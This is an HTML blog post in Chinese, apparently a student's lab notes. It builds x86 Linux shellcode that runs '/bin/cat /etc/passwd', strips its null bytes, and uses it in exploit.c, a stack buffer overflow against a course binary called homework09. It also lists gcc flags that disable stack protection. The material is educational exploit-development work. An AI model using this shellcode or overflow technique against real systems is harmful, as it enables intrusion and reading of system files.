@@ -1,0 +1,389 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>gdb-study-2 | wd-z711&#39;s B10g</title>
+  <meta name="author" content="wd-z711">
+  
+  <meta name="description" content="Common student in China. Interested in web &amp; re.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="gdb-study-2"/>
+  <meta property="og:site_name" content="wd-z711&#39;s B10g"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'G-YHJSKZDC3Y', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wd-z711's B10g" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">wd-z711&#39;s B10g</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> gdb-study-2</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="gdb-study-2"><a href="#gdb-study-2" class="headerlink" title="gdb-study-2"></a>gdb-study-2</h1><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><img src="/images/gdb-study-2/image-20221108111906905.png" alt="image-20221108111906905" style="zoom:50%;" /></p>
+<p><strong>本文环境：</strong></p>
+<p>unbuntu 16.04 x86</p>
+<span id="more"></span>
+<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>编写shell程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> * name[<span class="number">3</span>];</span><br><span class="line">	name[<span class="number">0</span>] = <span class="string">&quot;/bin/cat&quot;</span>;</span><br><span class="line">	name[<span class="number">1</span>] = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">	name[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">	execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	foo();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>​    用gdb跟踪shell的运行，确定执行execve的系统功能调用号及其它寄存器的值：</p>
+<p><img src="/images/gdb-study-2/image-20221108112135216.png" alt="image-20221108112135216" style="zoom:50%;" /></p>
+<p>​    调试并运行：</p>
+<p><img src="/images/gdb-study-2/image-20221108112353024.png" alt="image-20221108112353024" style="zoom:50%;" /></p>
+<p><img src="/images/gdb-study-2/image-20221108112513659.png" alt="image-20221108112513659" style="zoom:50%;" /></p>
+<p>​    在此将进入内核的虚拟系统调用。反汇编__kernel_vsyscall，设置断点，继续执行直到sysenter指令。</p>
+<p><img src="/images/gdb-study-2/image-20221108112733902.png" alt="image-20221108112733902" style="zoom:50%;" /></p>
+<p><img src="/images/gdb-study-2/image-20221108112940161.png" alt="image-20221108112940161" style="zoom:66%;" /></p>
+<pre><code> 因此，执行sysenter之前寄存器的值为： **eax保存execve的系统调用号11； ebx保存字符串name[0]=”/bin/cat”这个指针； ecx保存字符串数组name这个指针； edx为0。**
+</code></pre><p>​    如果用相同的寄存器的值调用sysenter，则可以不调用execve函数， 也可以实现相同的目标。</p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>​    用功能调用实现execve (shell_asm.c)。其中，%eax内存0xb，%ebx内存”/etc/cat”，%ecx内存”/etc/passwd”。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span></span><br><span class="line">&#123; </span><br><span class="line">	__asm__(</span><br><span class="line">		<span class="string">&quot;mov $0x0,%edx ;&quot;</span></span><br><span class="line">		<span class="string">&quot;push %edx ;&quot;</span>	</span><br><span class="line">		<span class="string">&quot;push $0x7461632f ;&quot;</span></span><br><span class="line">		<span class="string">&quot;push $0x6e69622f ;&quot;</span></span><br><span class="line">		<span class="string">&quot;mov %esp,%ebx ;&quot;</span></span><br><span class="line">		<span class="string">&quot;push %edx ;&quot;</span>	</span><br><span class="line">	 	<span class="string">&quot;push $0x00647773 ;&quot;</span></span><br><span class="line">		<span class="string">&quot;push $0x7361702f ;&quot;</span></span><br><span class="line">		<span class="string">&quot;push $0x6374652f ;&quot;</span></span><br><span class="line">	  	<span class="string">&quot;mov %esp,%ecx ;&quot;</span>  </span><br><span class="line">	  	<span class="string">&quot;push %edx ;&quot;</span>	<span class="comment">//构建数组name[2]</span></span><br><span class="line">	    <span class="string">&quot;push %ecx ;&quot;</span>   <span class="comment">//构建数组name[1]</span></span><br><span class="line">	    <span class="string">&quot;push %ebx ;&quot;</span>   <span class="comment">//构建数组name[0]</span></span><br><span class="line">	   	<span class="string">&quot;mov %esp,%ecx ;&quot;</span>  <span class="comment">//把数组name赋给%ecx</span></span><br><span class="line">	  	<span class="string">&quot;mov $0xb,%eax ;&quot;</span></span><br><span class="line">		<span class="string">&quot;int $0x80 ;&quot;</span></span><br><span class="line">		<span class="comment">//&quot;sysenter ;&quot;</span></span><br><span class="line">		);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span><br><span class="line">&#123; </span><br><span class="line">	foo(); </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​    运行后发现和shell程序执行一样的功能。</p>
+<p>​    接着使用objdump反汇编操作码，并将操作码字符串保存为shellcode。</p>
+<p><img src="/images/gdb-study-2/image-20221108145825775.png" alt="image-20221108145825775" style="zoom:50%;" /></p>
+<p>​    shellcode如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\xba\x00\x00\x00\x00\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x77\x64\x00\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe1\x52\x51\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80&quot;</span></span><br></pre></td></tr></table></figure>
+<p>​    执行如下程序：（要加堆栈可执行）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\xba\x00\x00\x00\x00\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x77\x64\x00\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe1\x52\x51\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ((<span class="type">void</span> (*)())shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/gdb-study-2/image-20221108150711969.png" alt="image-20221108150711969" style="zoom:50%;" /></p>
+<p>​    虽然该shellcode能实现期望的功能，但shellcode中存在字符’\x00’ ， 而’\x00’是字符串结束标志。由于shellcode是要作为字符串拷贝到缓冲区中去的，在’\x00’之后的代码将丢弃。因此，shellcode中不能包含’\x00’ 。</p>
+<p>​    有两种方法避免shellcode中的’\x00’： </p>
+<p>(1) 修改汇编代码，用别的汇编指令代替会出现机器码’\x00’的汇编 指令，比如用xor %edx,%edx代替mov $0x0,%edx。这种方法适合 简短的shellcode； </p>
+<p>(2) 对shellcode进行编码，把解码程序和编码后的shellcode作为新的shellcode。</p>
+<p>​    修改后的汇编代码为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span></span><br><span class="line">&#123; </span><br><span class="line">	__asm__(</span><br><span class="line">		<span class="string">&quot;xor %edx,%edx ;&quot;</span> <span class="comment">//用 xor %reg, %reg 置换 mov $0x0, %reg</span></span><br><span class="line">		<span class="string">&quot;push %edx ;&quot;</span>	</span><br><span class="line">		<span class="string">&quot;push $0x7461632f ;&quot;</span></span><br><span class="line">		<span class="string">&quot;push $0x6e69622f ;&quot;</span></span><br><span class="line">		<span class="string">&quot;mov %esp,%ebx ;&quot;</span></span><br><span class="line">		<span class="string">&quot;push %edx ;&quot;</span>	</span><br><span class="line">	 	<span class="string">&quot;push $0x64777373 ;&quot;</span></span><br><span class="line">		<span class="string">&quot;push $0x61702f2f ;&quot;</span></span><br><span class="line">		<span class="string">&quot;push $0x6374652f ;&quot;</span> <span class="comment">//用 &quot;/etc//passwd&quot; 替换 &quot;/etc/passwd&quot;</span></span><br><span class="line">	  	<span class="string">&quot;mov %esp,%ecx ;&quot;</span>  </span><br><span class="line">	  	<span class="string">&quot;push %edx ;&quot;</span>	</span><br><span class="line">	    <span class="string">&quot;push %ecx ;&quot;</span> </span><br><span class="line">	    <span class="string">&quot;push %ebx ;&quot;</span>  </span><br><span class="line">	   	<span class="string">&quot;mov %esp,%ecx ;&quot;</span>  </span><br><span class="line">	  	<span class="string">&quot;lea 0xb(%edx),%eax ;&quot;</span> <span class="comment">//用lea 0xb(%edx), %eax置换 mov $0xb，％eax</span></span><br><span class="line">		<span class="string">&quot;int $0x80 ;&quot;</span></span><br><span class="line">		<span class="comment">//&quot;sysenter ;&quot;</span></span><br><span class="line">		);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span><br><span class="line">&#123; </span><br><span class="line">	foo(); </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/gdb-study-2/image-20221108152429483.png" alt="image-20221108152429483" style="zoom:50%;" /></p>
+<p>​    提取出有效shellcode为，运行一下也是成功的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\x31\xd2\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\x52\x51\x53\x89\xe1\x8d\x42\x0b\xcd\x80&quot;</span>;</span><br><span class="line">   <span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ((<span class="type">void</span> (*)())shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p><strong>目标：</strong>利用0x02中构造的shellcode攻击 homework09 （见我github的re_files）。</p>
+<p>​    首先用gdb看一下homework09。（注意要新建一个SmashSmallBuf.bin，否则调试时会出现错误）</p>
+<p><img src="/images/gdb-study-2/image-20221108153903750.png" alt="image-20221108153903750" style="zoom:50%;" /></p>
+<p><img src="/images/gdb-study-2/image-20221108154030562.png" alt="image-20221108154030562" style="zoom:60%;" /></p>
+<p><img src="/images/gdb-study-2/image-20221108154505133.png" alt="image-20221108154505133" style="zoom:75%;" /></p>
+<p><img src="/images/gdb-study-2/image-20221108154736098.png" alt="image-20221108154736098" style="zoom:90%;" /></p>
+<p>​    由此可知，应该在largebuf+128处放置攻击代码的跳转地址，shellcode必须放在largebuf+128+4= largebuf+132之后的位置。为了让攻击串适用于较大一些的缓冲区，将其放在largebuf - ( strlen(shellcode) +1) 开始的位置。</p>
+<p>​    构造exploit.c。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALL_BUFFER_START 0xbfffeb7c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ATTACK_BUFF_LEN 1024</span></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\x31\xd2\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\x52\x51\x53\x89\xe1\x8d\x42\x0b\xcd\x80&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ShellCodeSmashSmallBuf</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> attackStr[ATTACK_BUFF_LEN];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *ps;</span><br><span class="line">	FILE *badfile;</span><br><span class="line">	<span class="built_in">memset</span>(attackStr, <span class="number">0x90</span>, ATTACK_BUFF_LEN);</span><br><span class="line">	<span class="built_in">strcpy</span>(attackStr + (ATTACK_BUFF_LEN - <span class="built_in">strlen</span>(shellcode) - <span class="number">1</span>), shellcode);</span><br><span class="line">	ps = (<span class="type">unsigned</span> <span class="type">long</span> *)(attackStr+<span class="number">128</span>);</span><br><span class="line">	*(ps) = SMALL_BUFFER_START + <span class="number">0x100</span>;</span><br><span class="line">	attackStr[ATTACK_BUFF_LEN<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">	badfile = fopen(<span class="string">&quot;./SmashSmallBuf.bin&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">	fwrite(attackStr, <span class="built_in">strlen</span>(attackStr), <span class="number">1</span>, badfile);</span><br><span class="line">	fclose(badfile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	ShellCodeSmashSmallBuf();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​    运行结果如下，可以看到，exploit.c对homework09进行了有效的攻击。</p>
+<p><img src="/images/gdb-study-2/image-20221108161345445.png" alt="image-20221108161345445"></p>
+<hr>
+<p><strong>知识点1：</strong></p>
+<p>x86的汇编语法常见的有AT&amp;T和 Intel。 Linux下的编译器和调试器使用的是AT&amp;T语法(mov src, des)。Win32下的编译器和调试器使用的是Intel语法(mov des, src)。</p>
+<p><strong>知识点2：</strong></p>
+<p>英特尔32位架构(英语:Intel Architecture, 32-bit，缩写为IA-32)，常被称为i386、x86-32或是x86。</p>
+<p><strong>知识点3：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb 命令补充：</span><br><span class="line">disp /i $eip //查看eip此时的值，十六进制</span><br><span class="line">ni/si都是汇编级别的断点定位。si会进入汇编和C函数内部,ni不会。他俩都是每执行一次走一步，相当于ni是步过，si是步进。</span><br><span class="line">i reg //查看当前断点的所有寄存器值//i reg = info register</span><br><span class="line">$pc //代表当前汇编指令</span><br><span class="line">p //打印某个东西，比如 p /x 0x11-0x09</span><br></pre></td></tr></table></figure>
+<p><strong>知识点4：</strong></p>
+<p>静态链接时，采用”call <em>_dl_sysinfo”指令；动态链接时，采用”call </em>%gs:0x10”指令；</p>
+<p><strong>知识点5：</strong></p>
+<p>指令 sysenter 是快速系统调用功能的一部分 。 指令 sysenter 进行过专门的优化，能够以最佳性能转换到保护环 0 (CPL 0 。sysenter 是 int $0x80 的替代品，实现相同的功能 。int $0x80 是一条AT&amp;T语法的中断指令，用于Linux的系统调用。<br><img src="/images/gdb-study-2/image-20221107220757161.png" alt="image-20221107220757161" style="zoom: 50%;" /><br><strong>知识点6：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -z exestack //启用可执行的栈</span><br><span class="line">gcc -fno-stack-protector //禁用堆栈保护</span><br></pre></td></tr></table></figure>
+<p><strong>知识点7：</strong></p>
+<p><strong>objdump命令</strong>是用查看目标文件或者可执行的目标文件的构成的gcc工具。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--disassemble </span><br><span class="line">-d </span><br><span class="line">//从objfile中反汇编那些特定指令机器码的section。</span><br></pre></td></tr></table></figure>
+
+  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/2022/11/08/p2p-vedio/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2022/11/05/yum-and-apt/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+
+
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    <!-- 
+    <div id="disqus_thread" class="ds-thread">
+        <script type="text/javascript">
+            /**
+             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+             */
+                /*
+                 var disqus_config = function () {
+                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
+                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                 };
+                 */
+            (function() { // DON'T EDIT BELOW THIS LINE
+                var d = document, s = d.createElement('script');
+
+                s.src = 'https://https-wd-2711-tech.disqus.com/embed.js';
+
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
+                Disqus.</a></noscript>
+    </div> -->
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: 'wLIJ70s3fPvW8WJPgVVAuWVR-gzGzoHsz',
+            appKey: 'NVGqxhUkqtFv2CbwmXXWjCdR'
+        })
+    </script>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-11-07 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/study-notes/">study-notes<span>17</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+
+	<!-- copyright -->
+	<div>
+    <ul class="post-copyright">
+      <li class="post-copyright-author">
+      <strong>作者:  </strong>wd-z711</a>
+      </li>
+      <li class="post-copyright-link">
+      <strong>文章链接:  </strong>
+      <a href="/" target="_blank" title="">https://wd-2711.tech/</a>
+      </li>
+      <li class="post-copyright-license">
+        <strong>版权声明:   </strong>
+        本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+        许可协议。转载请注明出处!
+      </li>
+    </ul>
+  <div>
+ 	
+
+		
+
+
+</div><!-- row -->
+
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2023 wd-z711
+  
+      <!-- with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
+     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.     -->
+
+     <!-- <script type="text/javascript">
+      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+      
+      _st('install','aB-vgeB8gEDrnRJuhceL','2.0.0');
+    </script> -->
+    </p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+   </html>
